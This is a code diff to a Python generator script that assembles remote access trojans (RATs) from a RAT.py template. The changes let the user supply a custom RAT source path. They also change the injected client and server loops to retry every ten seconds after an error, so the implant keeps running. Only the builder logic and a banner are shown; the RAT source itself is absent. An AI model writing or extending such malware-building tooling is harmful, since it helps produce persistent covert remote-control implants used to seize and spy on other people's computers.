@@ -10,12 +10,15 @@ def clear():
         system("clear")
 def rgb(r, g, b):
     return "\033[38;2;{};{};{}m".format(r, g, b)
-def main(mode):
+def main(mode,path):
     clear()
-    if 'windows' in OStype().lower():
-        code =open(f'{__file__.replace("generator.py","")}RATS\\RAT.py','r')
-    else :
-        code =open(f'{__file__.replace("generator.py","")}RATS/RAT.py','r')
+    if path:
+        code =open(path)
+    else:
+        if 'windows' in OStype().lower():
+            code =open(f'{__file__.replace("generator.py","")}RATS\\RAT.py','r')
+        else :
+            code =open(f'{__file__.replace("generator.py","")}RATS/RAT.py','r')
     mainCode=code.read()
     selection=input(f"""
 {rgb(255, 51, 51)}  ▄████ ▓█████  ███▄    █ ▓█████  ██▀███   ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  
@@ -67,7 +70,7 @@ while 1:
     try:
         main()
     except : 
-        pass
+        sleep(10)
         '''
         elif mode=='server':
             mainFunc=f'''
@@ -85,7 +88,7 @@ while 1:
     try:
         main()
     except : 
-        pass
+        sleep(10)
         '''
         mainCode+=mainFunc
         currPath=getcwd()
